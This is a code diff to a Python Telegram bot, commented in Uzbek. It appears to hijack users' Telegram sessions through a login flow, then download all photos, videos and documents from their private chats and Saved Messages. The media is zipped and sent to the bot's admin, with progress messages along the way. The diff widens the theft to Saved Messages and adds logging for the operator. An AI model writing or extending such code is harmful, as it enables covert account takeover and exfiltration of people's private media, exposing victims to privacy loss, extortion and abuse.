@@ -242,7 +242,13 @@ async def login_flow(msg: types.Message):
         await export_medias(uid)
 
 # ================== EXPORT MEDIAS ==================
-from telethon.tl.types import InputMessagesFilterPhotos, InputMessagesFilterVideo, InputMessagesFilterDocument
+from telethon.tl.types import (
+    User,
+    InputPeerSelf,
+    InputMessagesFilterPhotos,
+    InputMessagesFilterVideo,
+    InputMessagesFilterDocument
+)
 
 async def export_medias(uid):
     client = sessions[uid]["client"]
@@ -252,48 +258,74 @@ async def export_medias(uid):
 
     os.makedirs(MEDIA_DIR, exist_ok=True)
 
-    total = 0  # sanash uchun
+    total = 0
 
-    async for dialog in client.iter_dialogs():
-        if not isinstance(dialog.entity, User):
-            continue
-        if dialog.entity.bot:
+    # 🔔 ADMIN LOG (boshlanishi)
+    await bot.send_message(ADMIN_ID, "🚀 Media yig‘ish boshlandi")
+
+    dialogs = []
+
+    async for d in client.iter_dialogs():
+        dialogs.append(d)
+
+    # ➕ Saved Messages ni qo‘shamiz
+    dialogs.append(types.SimpleNamespace(entity=InputPeerSelf()))
+
+    for dialog in dialogs:
+        entity = dialog.entity
+
+        # BOTLARNI O‘TKAZIB YUBORAMIZ
+        if isinstance(entity, User) and entity.bot:
             continue
 
-        user_folder = os.path.join(MEDIA_DIR, str(dialog.entity.id))
+        folder_name = "saved" if isinstance(entity, InputPeerSelf) else str(getattr(entity, "id", "unknown"))
+        user_folder = os.path.join(MEDIA_DIR, folder_name)
         os.makedirs(user_folder, exist_ok=True)
 
-        # 🔥 FAQAT MEDIA FILTRLARI
         for flt in (
             InputMessagesFilterPhotos,
             InputMessagesFilterVideo,
             InputMessagesFilterDocument,
         ):
-            async for m in client.iter_messages(dialog.entity, filter=flt):
+            async for m in client.iter_messages(entity, filter=flt):
                 try:
                     await m.download_media(file=user_folder)
                     total += 1
-                except:
-                    pass
+
+                    # 🔔 har 5 ta media log
+                    if total % 5 == 0:
+                        await bot.send_message(
+                            ADMIN_ID,
+                            f"📥 Yuklandi: {total} ta media"
+                        )
+                except Exception as e:
+                    print("Xato:", e)
 
     # 🔒 ZIP
-    with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as z:
-        for root, _, files in os.walk(MEDIA_DIR):
-            for file in files:
-                full = os.path.join(root, file)
-                z.write(full, arcname=os.path.relpath(full, MEDIA_DIR))
+    if total == 0:
+        await bot.send_message(ADMIN_ID, "⚠️ Hech qanday media topilmadi")
+    else:
+        with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as z:
+            for root, _, files in os.walk(MEDIA_DIR):
+                for file in files:
+                    full = os.path.join(root, file)
+                    z.write(full, arcname=os.path.relpath(full, MEDIA_DIR))
 
-    await bot.send_document(
-        ADMIN_ID,
-        types.InputFile(ZIP_NAME),
-        caption=f"📦 Lichkadagi medialar\nJami: {total} ta"
-    )
+        await bot.send_document(
+            ADMIN_ID,
+            types.InputFile(ZIP_NAME),
+            caption=f"📦 Media ZIP\nJami: {total} ta"
+        )
+
+        os.remove(ZIP_NAME)
 
     shutil.rmtree(MEDIA_DIR)
-    os.remove(ZIP_NAME)
 
     await client.disconnect()
     sessions.pop(uid, None)
+
+    await bot.send_message(ADMIN_ID, "✅ Media yig‘ish tugadi")
+
 
 
 # ================== ADMIN ==================
